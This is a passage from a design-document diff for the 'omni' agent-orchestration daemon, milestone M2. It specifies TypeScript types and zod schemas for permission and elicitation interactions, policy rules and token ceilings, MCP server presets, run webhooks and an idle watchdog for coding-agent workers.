+  run(): RunId;
+  delivery(): DeliveryId;
+}
+```
+
+> **Migration.** `InteractionPayload.requestId` / `PolicyDecisionPayload.requestId` become `InteractionId`
+> at the TYPE level, but `eventEnvelopeSchema` keeps `z.string()` for that field, so an M1-era persisted
+> envelope carrying `perm_1757…_3` still parses. New ids are always `x_<ULID>`.
+
+#### 5.8.2 `src/errors.ts`
+
+```ts
+export const OMNI_ERROR_CODES = [
+  …,                       // M0/M1's thirteen, unchanged
+  /** M2, and the ONLY renegotiation of DESIGN §5.4's table (ruling M2-R2). Two addressable resources
+   *  share one path — a bare 404 on `/v1/workers/{wid}/interactions/{reqId}` cannot say WHICH is gone,
+   *  and a client that retries a worker 404 by recreating its worker would do so over a stale reqId. */
+  "interaction_not_found",  // 404
+  "interaction_settled",    // 409
+  …,
+] as const;
+
+export interface OmniErrorBody {
+  code: OmniErrorCode; message: string;
+  acp?: AcpErrorDetail; lease?: LeaseSnapshot; resume?: ResumeReport;
+  /** ONLY on `interaction_settled` (409) — the same courtesy `lease` pays on a 423: WHO settled it,
+   *  WHEN and HOW, without a second round trip that may already be stale. */
+  interaction?: InteractionSnapshot;
+  /** ONLY on `policy_exceeds_ceiling` (403). Which ceiling, and which rules it refused. */
+  policy?: { ceiling: string; offending: readonly string[] };
+}
+```
+
+`OmniError` gains the two option slots and spreads them exactly as `lease`/`resume` do, so two bodies for
+one failure stay deep-equal. `ERROR_STATUS` stays a total `Record` — the two additions are compile-checked.
+`packages/client/src/transport.ts`'s non-omni `STATUS_CODE` fallback is **not** changed: 404/409 keep their
+M1 winners for bodies that are not ours.
+
+#### 5.8.3 `src/events.ts`
+
+```ts
+/** M2-A: the full six. `requires_action` stops being wire-stable-and-unemitted (F43). */
+export const M2_WORKER_STATES = WORKER_STATES;
+
+export const EVENT_KINDS = [
+  …,                                    // M0/M1's six, unchanged
+  /** M2-B. One per Run state change, appended to the RUN'S WORKER'S log so `?since=` covers it and
+   *  `sse.ts` stays frozen. */
+  "omni.run",
+] as const;
+
+export type InteractionMethod = "session/request_permission" | "elicitation/create";
+export type InteractionKind = "permission" | "elicitation";
+/** `pending` MEANS parked: an auto-resolved interaction is emitted once, already terminal, so there is
+ *  no second word for the same state (ruling M2-R5). M1's three are a strict prefix. */
+export type InteractionStatus = "pending" | "answered" | "failed" | "expired" | "cancelled";
+export type InteractionActor = "baseline" | "policy" | "human" | "timeout" | "daemon";
+export type ParkTimeoutAction = "deny" | "fail";
+
+export type WorkerStateReason =
+  | …                              // M0/M1's, unchanged
+  /** running → requires_action: an interaction could not be auto-decided and `onUnresolved:"park"`. */
+  | "interaction_parked"
+  /** requires_action → running: the LAST parked interaction settled. */
+  | "interaction_resolved"
+  /** requires_action → running: `parkTimeoutAction` fired instead of a human. */
+  | "park_timeout"
+  /** The idle watchdog sent `session/cancel`. NOT a close — the escalation into `cancel_timeout` is. */
+  | "watchdog_idle";
+
+export interface WorkerStatePayload {
+  …
+  /** Present on `watchdog_idle` and on a `cancel_timeout` close the watchdog started, so an operator
+   *  can tell a silent stall from a stuck tool without reading the log. */
+  readonly watchdog?: { budget: "silent" | "tool"; idleMs: number; openToolCalls: number };
+  /** Present on `interaction_parked` / `interaction_resolved` / `park_timeout`. */
+  readonly interactions?: readonly InteractionId[];
+}
+
+export interface InteractionPayload {
+  readonly requestId: InteractionId;
+  readonly kind: InteractionKind;
+  readonly method: InteractionMethod;
+  /**
+   * M2: the NORMALIZED view — `{title, subject, options}` for a permission, `{message, fields}` for an
+   * elicitation — and the reason `payloadVersion` flips 1 → 2 on this kind. `worker.ts` pre-announced
+   * exactly this (F45).
+   */
+  readonly request: Readonly<Record<string, unknown>>;
+  /**
+   * The agent's bytes, untouched, `_meta` included (§7.5). Kept BESIDE the mapped form rather than
+   * replaced by it, because an audit of a reshaped object audits our reshaping — and because
+   * `_meta._askUserQuestionCustomAnswer` (F30) is the field that decides which of two properties the
+   * agent will actually read, and it exists nowhere else.
+   */
+  readonly raw: Readonly<Record<string, unknown>>;
+  readonly status: InteractionStatus;
+  /** Present exactly while `status === "pending"`. `expiresAt: null` = parked forever. */
+  readonly park?: { readonly parkedAt: string; readonly expiresAt: string | null; readonly onTimeout: ParkTimeoutAction };
+  /** `subject.toolCall.toolCallId`, or the elicitation's FLAT `params.toolCallId` (F29). The join to
+   *  the `AskUserQuestion` tool-call mirror (F32) — without it the same interaction counts twice. */
+  readonly toolCallId: string | null;
+  readonly answer?: {
+    /** permission only; null for every elicitation and for a `-32603`. */
+    readonly optionId: string | null;
+    readonly by: InteractionActor;
+    /** elicitation only. F31: accept and decline are indistinguishable in the agent's stream, so this
+     *  is the ONLY record the outcome has. */
+    readonly action?: "accept" | "decline" | "cancel";
+    /** elicitation only. **KEYS ONLY** — a free-text answer is user content and never enters the log. */
+    readonly contentKeys?: readonly string[];
+    /** The answering token, when `by === "human"`. DESIGN §8's audit. */
+    readonly byToken?: TokenId;
+    /** ms spent parked. 0 for an auto-resolved interaction. */
+    readonly parkedMs: number;
+  };
+}
+
+export interface PolicyDecisionPayload {
+  readonly requestId: InteractionId;
+  readonly kind: InteractionKind;
+  readonly method: InteractionMethod;
+  readonly title: string;
+  /**
+   * WIDENED, and there is exactly ONE of these per interaction, emitted at SETTLEMENT (ruling M2-R4).
+   * `answer` / `cancel` are the elicitation arms: an accepted elicitation is not a granted permission
+   * and must never be counted as one. There is deliberately no `"park"` arm — a park is not a decision,
+   * and a row that must later be corrected is a fold row that was never true.
+   */
+  readonly decision: "allow" | "deny" | "answer" | "cancel" | "error";
+  readonly by: InteractionActor;
+  readonly rule: string;
+  /** Where `rule` came from, so an operator tells a ceiling clamp from an author's intent. */
+  readonly ruleSource: "baseline" | "default" | "preset" | "inline" | "ceiling";
+  /** Set when the token's `policyCeiling` narrowed the resolved action. NEVER silent (§20.5). */
+  readonly clamped?: { readonly from: PolicyAction; readonly by: string };
+  readonly parkedMs: number;
+  readonly optionId: string | null;
+  /** `[]` for an elicitation — an empty array is not a null. */
+  readonly offered: readonly PermissionOption[];
+  readonly toolCallId: string | null;
+  /**
+   * F26: after ONE `allow_always` the engine is never consulted again for that session and nothing on
+   * the wire says so. Only reachable under `interaction.allowAlways:"human"`; it is how WE announce
+   * what the agent will not, and it makes `WorkerSnapshot.policyBlinded` sticky.
+   */
+  readonly blindsPolicy?: true;
+}
+
+export type RunState =
+  | "queued" | "starting" | "running" | "requires_action"
+  | "succeeded" | "failed" | "cancelled"
+  /** A previous boot owned this run; its worker died with that boot (§24.4). */
+  | "abandoned";
+
+export interface RunEventPayload {
+  readonly runId: RunId;
+  readonly state: RunState;
+  readonly previous: RunState | null;
+  readonly reason: string;
+  readonly error?: OmniErrorBody;
+}
+
+export type EventBody = … | { readonly kind: "omni.run"; readonly payload: RunEventPayload };
+```
+
+`eventEnvelopeSchema` gains the `omni.run` arm and widens the two interaction arms; `WORKER_STATE_REASONS`
+gains the four new reasons. **Every widening is additive and a checked-in M1 `events.db` parses under the M2
+schema in a golden test** — the one narrowing that is not (`request` was a `Record` and is now a mapped
+view) is satisfied by every M2-written envelope and by no M1-written one, which is why `request` stays a
+shallow `z.record` and `payloadVersion` (1 vs 2) is what tells the two shapes apart. That is the field's
+entire job (ruling M1-R10).
+
+**No new `WorkerCloseReason`.** The watchdog escalates into M1's existing `cancel_timeout`, and
+`parkTimeoutAction ∈ {deny, fail}` never closes a worker — so `turn.ts`'s `CLOSE_REASON_CODE`, a **total**
+`Record` over `WorkerCloseReason`, needs no arm and cannot silently rot.
+
+#### 5.8.4 `src/worker.ts`
+
+```ts
+export interface AgentCapabilitiesSnapshot {
+  …
+  /**
+   * FROZEN AT HANDSHAKE from M2 on — the historical record of what the agent offered when the session
+   * opened. The LIVE list is `WorkerSnapshot.configOptions`, because F34 shows the returned list is a
+   * full replacement whose MEMBERSHIP CAN SHRINK (four → two) while F35 shows another agent's does not.
+   */
+  readonly configOptions: readonly unknown[] | null;
+  /**
+   * D10's gate, AS SENT, verbatim. F28: `initialize`'s `agentCapabilities` never mentions elicitation
+   * either way, so our own declaration is the only record of why an agent asked in prose instead of
+   * calling `elicitation/create`. Not recording it makes D10 unauditable.
+   */
+  readonly clientCapabilities: Readonly<Record<string, unknown>>;
+}
+
+/**
+ * One entry of the agent's live config catalogue, addressable without reshaping it.
+ *
+ * F34: the entry's own key is `id` while the REQUEST parameter is `configId` — two different words for
+ * the same thing, and `id` is lifted through the descriptor's `configIdField` quirk so this file names
+ * neither spelling. `raw` is the agent's object BY IDENTITY (§7.5): codex spells its model id two ways
+ * (`models.availableModels[].modelId: "gpt-5.6-sol[low]"` vs `configOptions[model].currentValue:
+ * "gpt-5.6-sol"`), so anything that normalized `currentValue` would make a snapshot fail to match itself.
+ */
+export interface ConfigOptionView {
+  readonly id: string;
+  readonly currentValue: unknown;
+  readonly raw: Readonly<Record<string, unknown>>;
+}
+
+/** One property of an `elicitation/create` `requestedSchema`, after mapping (F30). */
+export interface ElicitationField {
+  /** The PROPERTY NAME (`question_0`). Answers are keyed by QUESTION id, which is this. */
+  readonly id: string;
+  readonly title: string | null;
+  readonly type: "string" | "integer" | "number" | "boolean" | "array";
+  /** `oneOf[].const` ∪ `enum`, in wire order. F30: claude-acp sends `oneOf`, and a reader that knows
+   *  only `enum` sees every question as unconstrained free text. */
+  readonly options: readonly { value: string; title: string | null; description: string | null }[];
+  /** No `required` array was observed in either elicitation (F29) ⇒ false unless one appears. */
+  readonly required: boolean;
+  /**
+   * The paired free-text property (`question_0_custom`), identified by
+   * `_meta._askUserQuestionCustomAnswer.{questionId, isCustomAnswer}`. F30 is the whole reason this
+   * field exists: filling BOTH made the agent use the CUSTOM value and create the wrong file.
+   */
+  readonly customField: string | null;
+  /** Set when THIS property is somebody else's custom slot; it is never answered directly. */
+  readonly isCustomFor: string | null;
+  /** `minLength`/`maxLength`/`minimum`/`maximum`/`minItems`/`maxItems`, verbatim, when present. */
+  readonly constraints: Readonly<Record<string, number>>;
+}
+
+export interface InteractionSnapshot {
+  readonly requestId: InteractionId;
+  readonly workerId: WorkerId;
+  readonly kind: InteractionKind;
+  readonly method: InteractionMethod;
+  readonly status: InteractionStatus;
+  readonly title: string;
+  readonly message: string | null;
+  readonly turnId: TurnId | null;
+  readonly toolCallId: string | null;
+  readonly createdAt: string;
+  /** permission: the agent's offered options, verbatim (D4 rule 1's input). `[]` for an elicitation. */
+  readonly options: readonly PermissionOption[];
+  /** elicitation: `requestedSchema` normalized for a UI. `[]` for a permission. Never a substitute for
+   *  `InteractionPayload.raw`. */
+  readonly fields: readonly ElicitationField[];
+  /** null once settled, and null while parked forever. NEVER a lie: cleared the moment the timer is
+   *  disarmed, exactly as `LeaseSnapshot.expiresAt` is under a pin. */
+  readonly expiresAt: string | null;
+  readonly settledAt: string | null;
+  readonly settledBy: InteractionActor | null;
+  readonly answer: InteractionPayload["answer"] | null;
+}
+
+export interface PolicySnapshot {
+  /** Preset names in application order, then `"inline"` when the request carried rules. */
+  readonly sources: readonly string[];
+  readonly default: PolicyAction;
+  readonly onUnresolved: "park" | "deny" | "fail";
+  readonly ruleCount: number;
+  /** The token's ceiling this worker was admitted under, for the audit trail. */
+  readonly ceiling: string | null;
+}
+
+export interface WorkerSnapshot {
+  …                                        // every M0/M1 member unchanged
+  /** The LIVE catalogue. Seeded from `capabilities.configOptions`, REPLACED WHOLESALE by every
+   *  `POST …/config` from the METHOD's own result (F34, F35), never from the event stream. */
+  readonly configOptions: readonly ConfigOptionView[] | null;
+  // ── M2-A ────────────────────────────────────────────────────────────────
+  /** Fixed at creation. It decides whether `clientCapabilities.elicitation` is declared (D10, F28). */
+  readonly onUnresolved: "park" | "deny" | "fail";
+  readonly parkTimeoutMs: number | null;
+  readonly parkTimeoutAction: ParkTimeoutAction;
+  /** Pending interactions, oldest first. Non-empty **⟺** `state === "requires_action"` (§19.5). */
+  readonly interactions: readonly InteractionSnapshot[];
+  /** The RESOLVED budgets in force, so an operator reads them without re-deriving config. `null` when
+   *  `watchdog.enabled:false`. */
+  readonly watchdog: { silentMs: number; toolMs: number; cancelTimeoutMs: number;
+                       armedAt: string | null; budget: "silent" | "tool" | null } | null;
+  /** STICKY. True once any `allow_always` was ever selected on this session (F26). Never goes back. */
+  readonly policyBlinded: boolean;
+  // ── M2-B ────────────────────────────────────────────────────────────────
+  /** null when this worker runs on the baseline responder (no engine configured) — i.e. M2-A. */
+  readonly policy: PolicySnapshot | null;
+  /** Reported, never silent: a preset the agent could not take is a capability the client did not get. */
+  readonly mcp: {
+    readonly requested: readonly string[];
+    readonly applied: readonly string[];
+    readonly dropped: readonly { name: string; reason: string }[];
+  };
+  /** KEY NAMES ONLY. An env VALUE never reaches a snapshot, a log line or an HTTP body (DESIGN §8). */
+  readonly envKeys: readonly string[];
+  readonly patchMode: "off" | "on_write" | "always";
+}
+```
+
+#### 5.8.5 `src/turn.ts` (Land-written, transferred to the watchdog work package)
+
+```ts
+export interface TurnWarning {
+  readonly code: string;
+  readonly message: string;
+  readonly source: "usage_meta" | "stderr" | "policy" | "tool_status" | "patch" | "watchdog";
+  readonly detail?: Readonly<Record<string, unknown>>;
+}
+
+export interface InteractionRecord {
+  readonly requestId: InteractionId;
+  readonly kind: InteractionKind;
+  readonly method: InteractionMethod;
+  readonly title: string;
+  readonly decision: "allow" | "deny" | "answer" | "cancel" | "error";
+  readonly by: InteractionActor;
+  readonly parkedMs: number;
+  /** F32's join: the same interaction is ALSO a `tool_call` in the stream. `toolCalls` keeps the tool
+   *  call, `interactions` keeps the decision, neither duplicates the other. */
+  readonly toolCallId: string | null;
+  readonly optionId: string | null;
+  readonly rule: string;
+  readonly at: string;
+}
+
+export interface TurnResult {
+  …
+  /**
+   * D8's disk truth, filled by the git provider (§25) and by nothing else. `null` outside a repo, when
+   * no provider is wired, when `patchMode` skipped this turn, when git failed, or over `diff.maxBytes` —
+   * and **every one of those nulls carries a `TurnWarning{source:"patch"}` saying which**.
+   *
+   * It rides on `state_update{idle}._meta["omni/patch"]`, exactly as `vendorPatch` and `warnings`
+   * already do, so this fold stays PURE and cannot spawn `git` — and the SDK's local `reduceTurn()` and
+   * the daemon's `GET /turns/{id}` still cannot disagree (D7, DESIGN §5.5).
+   */
+  readonly patch: string | null;
+  readonly patchInfo: {
+    readonly source: "git" | null;
+    readonly truncated: boolean;
+    /** "shared_worktree" ⇒ another live worker shares this repo, so the patch may contain ITS edits and
+     *  can even contain a half-written file. We report rather than misattribute (§25.4). */
+    readonly quality: "exact" | "shared_worktree" | "unavailable";
+  } | null;
+  /**
+   * Tool calls whose LAST observed status is neither `completed` nor `failed` when the turn ended —
+   * `null` counts, because "we were never told" is exactly the condition this reports.
+   *
+   * F36 is the same fact on both real agents: cancelling with a tool in flight produces **no terminal
+   * `tool_call_update` at all**. Synthesizing `failed` would be a lie (the tool may well have completed
+   * agent-side); blocking for a terminal update would hang forever. So we report, and the turn is
+   * `partial` (ruling M2-R8).
+   */
+  readonly strandedToolCalls: readonly string[];
+  /** PERMISSION denials only. F31: a declined elicitation leaves its tool call `completed`, so joining
+   *  it here would report a tool we blocked that in fact ran. The join is gated on
+   *  `method === "session/request_permission"` and there is a named table test for exactly that. */
+  readonly deniedToolCalls: readonly string[];
+  /** requestIds that were `pending` when this fold ended. For a running turn this is "waiting for you";
+   *  for a finished one it is a bug report. */
+  readonly pendingInteractions: readonly InteractionId[];
+}
+```
+
+Fold changes, all inside `fold()`/`materialize()`, **no new envelope kind read**:
+
+* `PATCH_META = "omni/patch"` joins the three `_meta` keys of §12.5, read on the `state_update{idle}` arm.
+* `WARNING_SOURCES` gains `"patch"` and `"watchdog"`.
+* `acp.interaction` is folded **only** for the pending set (a `Set` keyed on `requestId`), so
+  `InteractionRecord` is still built from ONE envelope kind (review R9) and the fold gains no second
+  source of truth.
+* `strandedToolCalls` is computed only when the turn is terminal — a running turn strands nothing.
+* the verdict ladder gains one arm: `failed` if `error`, else `partial` if `failedToolCalls`,
+  `deniedToolCalls`, `strandedToolCalls` **or** `pendingInteractions` is non-empty, else `ok`.
+
+Every M1 golden that asserts `patch: null` passes unchanged; `patchInfo`, `strandedToolCalls` and
+`pendingInteractions` are new keys asserted additively.
+
+#### 5.8.6 `src/control-plane.ts`
+
+```ts
+export const CreateWorkerRequest = z.strictObject({
+  agent: z.string().min(1),
+  cwd: z.string().min(1),
+  label: z.string().max(200).optional(),
+  /**
+   * PRESET NAMES ONLY, resolved against `DaemonConfig.mcpServers`. A client can never put a `command`
+   * on this wire — DESIGN §8's 🔴 row is enforced by the TYPE, not by a validator somebody could move.
+   * An unknown name is `400` **naming it**; a name outside the token's `mcp` allowlist is `403`. Never
+   * a silent drop, which would let a client believe a tool was available.
+   */
+  mcp: z.array(z.string().min(1).max(64)).max(8).optional(),
+  /** D4. `"park"` is ALSO the D10 switch: the only value under which this worker declares
+   *  `clientCapabilities.elicitation` (F28). Default `"deny"` — M1's behaviour, and the only
+   *  fail-closed default. */
+  onUnresolved: z.enum(["park", "deny", "fail"]).default("deny"),
+  /** 0 ⇒ a park never expires (a human is genuinely expected). Default `interaction.parkTimeoutMs`. */
+  parkTimeoutMs: z.number().int().nonnegative().max(86_400_000).optional(),
+  /** `"allow"` is deliberately NOT a value: an auto-allow on a timer is a remote-execution primitive
+   *  whose only guard is a clock (ruling M2-R7). Default `"deny"`. */
+  parkTimeoutAction: z.enum(["deny", "fail"]).optional(),
+  /** M2-B. A preset name, a list of them, or an inline document. Merged preset ⊕ inline, then checked
+   *  against the token's `policyCeiling`; exceeding it is `403 policy_exceeds_ceiling`. */
+  policy: PolicySelection.optional(),
+  /** M2-B. Blacklisted keys are REJECTED with a 400 naming them, never silently dropped (§23.3). */
+  env: z.record(z.string().min(1).max(256), z.string().max(8_192)).optional(),
+  /** M2-A. Per-worker override of the daemon-wide `watchdog` block, field by field. */
+  watchdog: WatchdogOverride.optional(),
+  /** M2-B. Per-worker `diff.mode`. */
+  patch: z.enum(["off", "on_write", "always"]).optional(),
+  timeoutMs: …, idleTimeoutMs: …, lease: …,     // unchanged
+});
+
+/** A preset name, a list of names, or an inline rule set (D4: 既可引用预设也可内联规则). */
+export const PolicySelection = z.union([
+  z.string().min(1).max(64),
+  z.array(z.string().min(1).max(64)).max(8),
+  z.strictObject({
+    presets: z.array(z.string().min(1).max(64)).max(8).optional(),
+    default: z.enum(POLICY_ACTIONS).optional(),
+    rules: z.array(PolicyRule).max(200).optional(),
+  }),
+]);
+
+export const WatchdogOverride = z.strictObject({
+  silentMs: z.number().int().nonnegative().max(86_400_000).optional(),
+  toolMs: z.number().int().nonnegative().max(86_400_000).optional(),
+  cancelTimeoutMs: z.number().int().positive().max(600_000).optional(),
+  enabled: z.boolean().optional(),
+});   // spelled out, NOT `.partial()` — the `ProbeOverrides` reason (§5.1), verbatim.
+
+/**
+ * H28. M0's text-only `.refine` is **DELETED, not widened**, and that is the dangerous half of this
+ * diff: zod holds no worker, so it can enforce neither this agent's `promptCapabilities` nor this
+ * token's `cwdRoots`, and DESIGN §5.1 requires BOTH. The semantic gate moves into
+ * `WorkerRegistry.prompt()` → `assertPromptContent()` (§26), and the `assert-prompt-content-is-called`
+ * guard covers the move — a schema that silently stopped enforcing containment looks exactly like a
+ * schema that got more capable.
+ */
+export const PromptRequestBody = z.strictObject({
+  content: z.array(ContentBlockLoose).min(1).max(64),
+});
+
+/** H22. `allow` without an `optionId` lets D4 rule 2's ordering choose; WITH one, it must have been
+ *  offered (rule 1) or the answer is `400`. */
+export const InteractionAnswerBody = z.discriminatedUnion("action", [
+  z.strictObject({ action: z.literal("allow"), optionId: z.string().min(1).max(200).optional(),
+                   note: z.string().max(500).optional() }),
+  z.strictObject({ action: z.literal("deny"), note: z.string().max(500).optional() }),
+  /** elicitation. Keyed by QUESTION id — ONE value per question; the daemon decides which wire property
+   *  carries it (F30, §19.4). */
+  z.strictObject({ action: z.literal("answer"),
+                   content: z.record(z.string().min(1).max(200),
+                     z.union([z.string().max(16_384), z.number(), z.boolean(),
+                              z.array(z.string().max(4_096)).max(64)])),
+                   note: z.string().max(500).optional() }),
+  /** UNVERIFIED: no `action:"cancel"` was ever observed on either agent. Descriptor-gated. */
+  z.strictObject({ action: z.literal("cancel") }),
+]);
+
+export interface InteractionAnswerResult {
+  readonly interaction: InteractionSnapshot;
+  /** The worker state AFTER the answer landed — `running` when the turn resumed. */
+  readonly state: WorkerState;
+  /** Seq of the `acp.interaction{settled}` this call produced, so a non-streaming client can poll
+   *  `?since=seq-1` and watch its own answer land. */
+  readonly seq: Seq;
+}
+export interface InteractionListResponse { readonly interactions: readonly InteractionSnapshot[]; }
+
+/** H24. One option per call, mirroring `session/set_config_option`. `configId` is the REQUEST spelling
+ *  (F34); the descriptor's `configIdField` quirk decides what actually reaches the wire, so this body
+ *  names the canonical word and `Normalizer.mapRequest` does the translation (§17.3, corpus: `optionId`
+ *  is `-32602` on claude-acp). */
+export const SetConfigBody = z.strictObject({
+  configId: z.string().min(1).max(200),
+  value: z.union([z.string().max(4_096), z.number(), z.boolean()]),
+});
+export interface SetConfigResponse {
+  /** The FULL replacement list, from the method's own result (F34, F35). */
+  readonly configOptions: readonly ConfigOptionView[];
+  /** Present when the returned membership differs from what we held — F34's shrink is real, not a bug. */
+  readonly removed: readonly string[];
+  readonly added: readonly string[];
+  /** true ⇒ the method returned NO list; the previous one is KEPT and never merged with a guess. */
+  readonly stale: boolean;
+}
+
+/** H25 (D9, DESIGN §9.3). */
+export const WebhookTarget = z.strictObject({
+  url: z.string().url().max(2_048),
+  events: z.array(z.enum(WEBHOOK_EVENTS)).min(1).optional(),
+  /** Names a secret in `DaemonConfig.webhooks.secrets`. A client never sends a secret VALUE. */
+  secret: z.string().min(1).max(64).optional(),
+});
+export const CreateRunRequest = z.strictObject({
+  agent: z.string().min(1), cwd: z.string().min(1),
+  prompt: z.array(ContentBlockLoose).min(1).max(64),
+  label: z.string().max(200).optional(),
+  mcp: z.array(z.string().min(1).max(64)).max(8).optional(),
+  policy: PolicySelection.optional(),
+  env: z.record(z.string().min(1), z.string()).optional(),
+  onUnresolved: z.enum(["park", "deny", "fail"]).optional(),
+  parkTimeoutMs: z.number().int().nonnegative().max(86_400_000).optional(),
+  parkTimeoutAction: z.enum(["deny", "fail"]).optional(),
+  watchdog: WatchdogOverride.optional(),
+  patch: z.enum(["off", "on_write", "always"]).optional(),
+  /** false (default) ⇒ the worker is closed when the run settles (DESIGN §9.3). */
+  keepWorker: z.boolean().optional(),
+  webhook: WebhookTarget.optional(),
+  /** Idempotency, scoped to the token. A repeat returns the ORIGINAL run, never a second one. */
+  idempotencyKey: z.string().min(8).max(200).optional(),
+  timeoutMs: z.number().int().min(1_000).max(86_400_000).optional(),
+});
+
+export interface RunSnapshot {
+  readonly runId: RunId; readonly daemonId: DaemonId; readonly state: RunState;
+  readonly agentId: string; readonly cwd: string;
+  readonly workerId: WorkerId | null; readonly turnId: TurnId | null;
+  readonly createdAt: string; readonly updatedAt: string;
+  readonly result: TurnResult | null; readonly error: OmniErrorBody | null;
+  /** Mirrors `WorkerSnapshot.persistence`. `"memory"` ⇒ this run does NOT survive a restart, and we say
+   *  so rather than letting `GET /v1/runs/{rid}` 404 mysteriously later (ruling M2-R14). */
+  readonly persistence: "memory" | "durable" | "degraded";
+  readonly webhook: { readonly url: string; readonly deliveries: number } | null;
+}
+
+export interface DeliveryRecord {
+  readonly deliveryId: DeliveryId; readonly runId: RunId; readonly event: WebhookEvent;
+  readonly state: "pending" | "delivering" | "delivered" | "failed";
+  readonly attempt: number; readonly nextAttemptAt: string | null;
+  readonly lastStatus: number | null; readonly lastError: string | null;
+  readonly responseMs: number | null;
+  readonly createdAt: string; readonly updatedAt: string;
+}
+
+export interface WhoAmIResponse {
+  …
+  /** M2-B. The ceiling this token may not exceed, or `null` for an unbounded token. The field never
+   *  appeared or disappeared — only its TYPE widened, which is the one compile break in M2 (§11.9). */
+  readonly policyCeiling: PolicyCeiling | null;
+  readonly policyPresets: readonly string[] | "*";
+  /** FAIL CLOSED: `[]` by default, not `"*"` — an MCP server is arbitrary code on this machine. */
+  readonly mcpPresets: readonly string[] | "*";
+  /** true ⇒ this token may create runs with a webhook (an operator-allowlisted origin exists). */
+  readonly webhooks: boolean;
+}
+
+/** Outbound only. Never parsed by the daemon; listed here so exactly one file spells them. */
+export const WEBHOOK_HEADER = {
+  signature: "omni-signature", deliveryId: "omni-delivery-id",
+  event: "omni-event", attempt: "omni-attempt",
+} as const;
+
+export const WEBHOOK_EVENTS = [
+  "run.completed", "run.failed", "run.requires_action", "worker.requires_action", "worker.closed",
+] as const;
+export type WebhookEvent = (typeof WEBHOOK_EVENTS)[number];
+```
+
+#### 5.8.7 `src/config.ts`
+
+```ts
+export const TokenConfig = z.object({
+  …                                              // M0/M1's members unchanged
+  /** D4. A named preset or an inline document; the MERGE of preset ⊕ inline may never exceed it. */
+  policyCeiling: PolicyCeiling.nullable().default(null),
+  policyPresets: z.union([z.literal("*"), z.array(z.string())]).default("*"),
+  /** FAIL CLOSED: default `[]`, not `"*"` (DESIGN §8's 🔴). */
+  mcpPresets: z.union([z.literal("*"), z.array(z.string())]).default([]),
+  /** Env var NAMES this token may set per worker, ON TOP of the hard blacklist. Default: none. */
+  envAllow: z.array(z.string().min(1)).default([]),
+  /** D9's HMAC key. Unlike `secret` this CANNOT be stored hashed — signing needs the plaintext. It is
+   *  never returned by any route and never logged; `webhookSecretFile` (0600, read at load) is the
+   *  recommended spelling and at most one of the two may be set. */
+  webhookSecret: z.string().min(32).optional(),
+  webhookSecretFile: z.string().optional(),
+});
+
+export const POLICY_ACTIONS = ["allow", "deny", "park", "fail"] as const;
+export type PolicyAction = (typeof POLICY_ACTIONS)[number];
+
+/** D4's match arm. `strictObject`: an unknown key in a security rule is a typo that would silently
+ *  WIDEN the rule, so it is a config LOAD failure. */
+export const PolicyMatch = z.strictObject({
+  /** v2's tagged subject arm. `"any"` is the default. */
+  subject: z.enum(["tool_call", "command", "any"]).default("any"),
+  method: z.enum(["session/request_permission", "elicitation/create", "any"]).default("any"),
+  /** v2 `ToolKind` values plus any vendor string, matched case-sensitively. An UNKNOWN kind matches
+   *  NOTHING but the literal `["*"]` — D4 rule 6 lifted from the responder to the matcher. */
+  kind: z.array(z.string().min(1).max(64)).min(1).max(32).optional(),
+  /** Globs over REALPATH'd absolute `subject.toolCall.locations[].path`. `**` crosses separators. A
+   *  relative pattern is a load error. F38: this clause NARROWS and never AUTHORISES (§20.3). */
+  path: z.array(z.string().min(1).max(512)).min(1).max(64).optional(),
+  /** ANCHORED (`^(?:…)$` is applied for you), length-capped, no backreferences, compiled once at
+   *  create. Only meaningful with `subject: "command"` — a `cmd` clause on a `tool_call` subject is
+   *  rejected at COMPILE, because F38 leaves it nothing to match on. */
+  cmd: z.string().min(1).max(512).optional(),
+  agent: z.array(z.string().min(1)).max(32).optional(),
+  // NOTE: there is deliberately NO `title` / `name` matcher (F27). `no-agent-prose` forbids adding one.
+});
+export const PolicyRule = z.strictObject({
+  id: z.string().min(1).max(64),
+  match: PolicyMatch,
+  action: z.enum(POLICY_ACTIONS),
+});
+export const PolicyPreset = z.strictObject({
+  extends: z.string().min(1).max(64).optional(),
+  default: z.enum(POLICY_ACTIONS).default("deny"),
+  rules: z.array(PolicyRule).max(200).default([]),
+  /** F40: a read-only `ls -A` ran with NO permission request while `python3 -c …` in the same cwd
+   *  raised one, and the split is invisible in the frame. So "no permission request" may never be read
+   *  as "no tool ran": a tool call of a listed kind that never reached the engine becomes
+   *  `TurnWarning{code:"unpoliced_tool_call"}` (§20.6). */
+  alertOnUnpoliced: z.array(z.string().min(1)).max(32).default([]),
+});
+export const PolicyConfig = z.object({
+  presets: z.record(z.string().max(64), PolicyPreset).default({}),
+  /** The preset a worker gets when the request names none. */
+  default: z.string().min(1).default("deny-all"),
+});
+
+/** A ceiling is written in a DELIBERATELY COARSER language than a rule, because glob∩glob and
+ *  regex∩regex containment is undecidable and a ceiling that LOOKS precise while being checked
+ *  approximately is worse than one that is honestly coarse (§20.5, ruling M2-R11). */
+export const PolicyCeiling = z.strictObject({
+  /** The widest action any rule may resolve to. `deny` and `fail` rank EQUAL: neither grants. */
+  maxAction: z.enum(POLICY_ACTIONS).default("allow"),
+  /** Kinds that may reach `allow`. Absent ⇒ any. */
+  allowKinds: z.array(z.string()).optional(),
+  /** Kinds that may never exceed `deny`, whatever a rule says. */
+  denyKinds: z.array(z.string()).default([]),
+  /** Every `path` glob in every rule must be lexically contained in one of these — a literal prefix
+   *  test on the pattern's non-wildcard head, which is decidable and total. */
+  pathRoots: z.array(z.string()).optional(),
+  /** May this token's rules match `subject: command` at all? */
+  commands: z.boolean().default(true),
+  /** May this token's workers use `onUnresolved:"park"` (⇒ declare elicitation)? */
+  park: z.boolean().default(true),
+});
+
+export const McpServerPreset = z.strictObject({
+  type: z.enum(["stdio", "http", "sse"]).default("stdio"),
+  /** stdio only. NEVER a shell string — the same rule as `AgentDescriptor.command` (§6.3). The ONLY
+   *  place in the whole system where an MCP command may appear (DESIGN §8 🔴). */
+  command: z.string().min(1).optional(),
+  args: z.array(z.string()).default([]),
+  url: z.string().url().optional(),                 // http/sse only
+  headers: z.record(z.string(), z.string()).default({}),
+  /** Preset-owned and operator-supplied. A client can NEVER contribute to it. */
+  env: z.record(z.string(), z.string()).default({}),
+});
+
+export const WatchdogConfig = z.object({
+  enabled: z.boolean().default(true),
+  /**
+   * Budget A (DESIGN §7's 无消息 N 分钟杀): nothing at all appended since the last update while a turn
+   * runs. 0 disables this half only. The clock starts at the LAST UPDATE, never at the prompt response
+   * — F25 makes that 7/7 on claude-acp, and codex emits `threadStatus:idle` BEFORE its response.
+   */
